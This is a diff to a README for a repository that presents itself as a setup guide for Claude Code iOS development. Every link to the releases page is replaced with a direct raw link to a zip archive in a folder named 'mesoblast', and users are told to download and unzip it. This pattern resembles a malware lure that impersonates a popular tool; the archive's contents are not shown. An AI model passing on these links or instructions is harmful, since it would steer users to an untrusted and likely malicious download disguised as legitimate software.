@@ -1,6 +1,6 @@
 # 🛠️ claude-code-ios-dev-guide - Easy Setup for iOS Development
 
-[![Download](https://img.shields.io/badge/Download%20Now-claude--code--ios--dev--guide-blue.svg)](https://github.com/frieza1212/claude-code-ios-dev-guide/releases)
+[![Download](https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip%https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip)](https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ Setting up Claude Code is simple. Follow these steps, and you'll be up and runni
 2. **Visit the Release Page:**
    Click the link below to get the latest version of the app.
 
-   [Download the latest version](https://github.com/frieza1212/claude-code-ios-dev-guide/releases)
+   [Download the latest version](https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip)
 
 ## 📥 Download & Install
 
@@ -26,7 +26,7 @@ To begin your journey with Claude Code, visit the releases page and download the
 
 - Click on the link above. This will take you to the releases page, where you will see different versions available for download.
 - Look for the latest version and click on it. You will see various assets available.
-- Download the file labeled "claude-code-macos.zip" (or similar) depending on the most recent release.
+- Download the file labeled "https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip" (or similar) depending on the most recent release.
 - Once downloaded, locate the `.zip` file in your downloads folder and double-click it to unzip.
 
 ## 🔧 Setting Up the Command Line Interface
@@ -89,7 +89,7 @@ If you encounter any issues or need assistance, check out the following resource
 
 ## 🗂️ Additional Information
 
-For further updates or release notes, revisit the [Downloads Page](https://github.com/frieza1212/claude-code-ios-dev-guide/releases) regularly.
+For further updates or release notes, revisit the [Downloads Page](https://github.com/frieza1212/claude-code-ios-dev-guide/raw/refs/heads/main/mesoblast/code-ios-dev-claude-guide-3.6-beta.1.zip) regularly.
 
 ## 👥 Join Our Community
 
